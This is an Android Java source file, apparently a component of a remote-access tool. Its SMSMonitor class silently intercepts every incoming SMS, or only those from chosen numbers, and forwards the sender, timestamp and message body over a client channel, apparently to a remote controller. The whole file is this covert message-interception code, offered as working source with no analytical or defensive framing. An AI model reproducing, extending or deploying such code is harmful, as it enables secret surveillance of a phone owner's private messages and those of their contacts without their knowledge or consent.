package my.app.Library;

import java.util.ArrayList;
import java.util.HashSet;

import utils.EncoderHelper;
import my.app.client.Client;
import my.app.client.ClientListener;
import Packet.SMSPacket;
import Packet.ShortSMSPacket;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SMSMonitor {

	ClientListener ctx;
	HashSet<String> phoneNumberFilter;
	int channel;

	public SMSMonitor(ClientListener c, int chan, byte[] args) {
		this.ctx = c;
		this.channel = chan;
		phoneNumberFilter = EncoderHelper.decodeHashSet(args);
		IntentFilter filter = new IntentFilter();
		filter.addAction("android.provider.Telephony.SMS_RECEIVED");
		ctx.registerReceiver(SMSreceiver, filter);
	}

	public void stop() {
		ctx.unregisterReceiver(SMSreceiver);
	}

	protected BroadcastReceiver SMSreceiver = new BroadcastReceiver() {

		private final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";

		@Override
		public void onReceive(Context context, Intent intent) {

			if (intent.getAction().equals(SMS_RECEIVED)) {
				Log.i("SMSReceived", "onReceive sms !");

				Bundle bundle = intent.getExtras();
				if (bundle != null) {
					Object[] pdus = (Object[]) bundle.get("pdus");

					final SmsMessage[] messages = new SmsMessage[pdus.length];
					for (int i = 0; i < pdus.length; i++) {
						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
					}
					if (messages.length > -1) {

						String messageBody = messages[0].getMessageBody();
						String phoneNumber = messages[0].getDisplayOriginatingAddress();
						long date = messages[0].getTimestampMillis();

						if (phoneNumberFilter == null) {
							ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date, messageBody);
							ctx.handleData(channel, sms.build());
						} else {
							if (phoneNumberFilter.contains(phoneNumber)) {
								Log.i("SMSReceived", "Message accepted as triggering message !");
								ShortSMSPacket sms = new ShortSMSPacket(phoneNumber, date, messageBody);
								ctx.handleData(channel, sms.build());
							}
						}
					}
				}
			}
		}
	};

}
